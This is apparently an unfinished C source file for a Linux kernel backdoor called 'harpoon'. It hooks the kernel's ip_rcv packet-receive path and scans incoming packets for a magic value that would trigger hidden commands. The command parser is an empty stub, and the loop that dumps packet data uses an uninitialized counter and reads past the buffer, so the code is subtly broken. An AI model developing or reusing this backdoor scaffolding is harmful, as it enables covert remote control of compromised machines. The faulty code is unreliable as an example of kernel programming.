#include <net/ip.h>

#include "backdoor.h"

void harpoon_parse_cmd(struct sk_buff *skb)
{
    return;
}

bool is_harpoon_packet(struct sk_buff *skb)
{
    __u8 *sk_data;
    __u32 sk_data_len;

    if (!skb)
    {
        return false;
    }
    sk_data = skb_mac_header(skb);
    if (skb_is_nonlinear(skb))
    {
        sk_data_len = skb->data_len;
    }
    else
    {
        sk_data_len = skb->len;
    }

    if(!memcmp(sk_data, HARPOON_MAGIC, HARPOON_MAGIC_LEN)){
        printk(KERN_INFO "Harpoon magic found");
    }
    for (int i; i < sk_data_len; i++){
        printk(KERN_INFO "%llx", ((__u64 *)sk_data)[i]);
    }

    return false;
}

void harpoon_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
                    struct net_device *orig_dev)
{

    printk(KERN_INFO "Hooked ip_rcv\n");
    if (is_harpoon_packet(skb))
    {
        harpoon_parse_cmd(skb);
    }
    return;
}